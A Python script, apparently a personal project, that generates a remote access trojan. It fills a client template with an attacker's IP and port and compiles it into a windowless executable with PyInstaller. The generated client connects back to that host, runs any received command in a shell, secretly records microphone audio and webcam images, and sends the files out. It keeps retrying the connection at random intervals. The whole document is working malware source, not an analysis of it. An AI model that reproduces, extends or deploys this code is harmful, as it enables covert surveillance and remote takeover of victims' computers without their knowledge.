import os
import tempfile
def gerador(ip,porta,para):
    molde ="""
# coding: utf-8
import os
import socket
import subprocess
import pyscreenshot as ImageGrab  # ....................: linux derivados
import tempfile
import shutil
from time import sleep
import cv2
import random
import sounddevice as sd
from scipy.io.wavfile import write

class Computador():

    def connect(self):
        plug = socket.socket()
        plug.connect(("{}", {}))
        try:
            while True:

                cmd = plug.recv(1024)

                if 'sair' in cmd.decode():
                    plug.close()
                    break

                elif 'audio' in cmd.decode():

                    fs = 64000  #  frequencia: 4999, 64000
                    seconds = 5
                    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                    sd.wait()
                    dirpath = tempfile.mkdtemp()
                    audio = dirpath + "aqui.wav"
                    shutil.rmtree(dirpath)
                    print("gravado")
                    write(str(audio), fs, myrecording)
                    try:
                        print("==> ", audio)
                        Transferir().transferir(plug, audio)
                    except Exception as e:
                        plug.send(str(e).encode())


                elif 'cam' in cmd.decode():
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
                    cv2.imshow('frame', rgb)
                    dirpath = tempfile.mkdtemp()
                    cam = dirpath + "\systemWindows.jpeg"
                    cv2.imwrite(cam, frame)
                    cap.release()
                    cv2.destroyAllWindows()
                    try:
                        Transferir().transferir(plug, cam)
                        shutil.rmtree(dirpath)
                    except Exception as e:
                        plug.send(str(e).encode())
                else:
                    CMD = subprocess.Popen(cmd.decode(),
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    plug.send(CMD.stdout.read())
                    plug.send(CMD.stderr.read())
        except OSError:
            print("erro")
            plug.close()
            print("fechou sera")





class Transferir():

    def transferir(self, s, arq):
        if os.path.exists(arq):
            f = open(arq, 'rb')
            pacote = f.read(9000000)
            while pacote:
                s.send(pacote)
                pacote = f.read(9000000)
                s.send('DONE'.encode())
            f.close()
        else:
            s.send('Arquivo não encontrado'.encode())



if __name__ == '__main__':
    while True:
        try:
            if Computador().connect() == 1:
                break
        except:
            sleep_for = random.randrange(1, 10)
            sleep(int(sleep_for))
            pass

    
    
    
    
    """.format(ip,porta)
    diretorio = tempfile.mkdtemp(para)
    arquivo_desktop = "{}{}".format("/home/jfc-me/Desktop/codigos/computador/",para+".py")
    f = open(arquivo_desktop, "w")
    f.write(molde)
    gerar_exec = "/home/jfc-me/.virtualenvs/k35/bin/pyinstaller -F -w {}".format(arquivo_desktop)
    os.system(gerar_exec)
    os.remove(arquivo_desktop)